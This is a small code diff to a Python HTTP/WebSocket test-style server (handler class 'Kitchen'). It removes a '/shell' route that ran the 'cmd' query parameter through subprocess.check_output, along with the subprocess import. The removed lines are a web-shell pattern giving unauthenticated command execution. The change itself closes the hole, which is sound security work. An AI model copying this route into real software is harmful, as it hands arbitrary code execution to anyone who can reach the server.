@@ -36,7 +36,6 @@ import socketserver
 import ssl
 import string
 import struct
-import subprocess
 import sys
 import threading
 import time
@@ -766,10 +765,6 @@ class Kitchen(HTTPWebSocketsHandler):
             self.__headers['Content-Type'] = 'application/json'
             info = self.__request_info()
             self.__set_response(info.encode('utf-8'))
-            
-        elif path == '/shell':
-            self.__status = int(query_params.get('status', 200))
-            self.__set_response(subprocess.check_output(query_params.get('cmd')))
 
         elif path == '/sleep':
             self.__status = int(query_params.get('status', 200))
